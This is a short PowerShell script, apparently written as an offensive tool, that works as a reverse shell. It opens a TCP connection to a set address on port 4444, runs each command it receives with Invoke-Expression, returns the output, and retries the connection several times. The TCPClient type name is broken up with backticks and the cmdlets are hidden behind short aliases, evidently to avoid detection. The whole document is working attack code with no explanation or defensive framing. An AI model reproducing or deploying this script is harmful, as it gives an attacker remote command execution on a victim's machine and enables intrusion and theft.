# Author: Omar Salazar
# Define constants
$ip = "192.168.1.1" 
$port = 4444
$retryInterval = 10  
$maxRetries = 5  

# Create aliases for cmdlets
Set-Alias -Name "n" -Value "New-Object"
Set-Alias -Name "s" -Value "Start-Sleep"
Set-Alias -Name "g" -Value "Get-Location"

# Main loop
do {
    # Create TCP client
    $c = n S`ySt`em.N`eT.`s`ock`eTs.TC`PC`li`eNt($ip, $port)
    $s = $c.GetStream()

    # Buffer for incoming data
    $b = n Byt`e[] 1024
    $d = ""

    # Read loop
    while (($x = $s.Read($b, 0, $b.Length)) -ne 0) {
        # Decode and execute command
        $e = (n -TypeName System.Text.ASCIIEncoding).GetString($b,0, $x)
        $f = (iex $e 2>&1 | Out-String)

        # Prepare and send response
        $g = $f + (g).Path + '> '
        $h = ([text.encoding]::ASCII).GetBytes($g)
        $s.Write($h,0,$h.Length)
        $s.Flush()
    }

    # Close connection and wait before trying again
    $c.Close()
    s -Seconds $retryInterval
    $maxRetries--
} while ($maxRetries -gt 0)
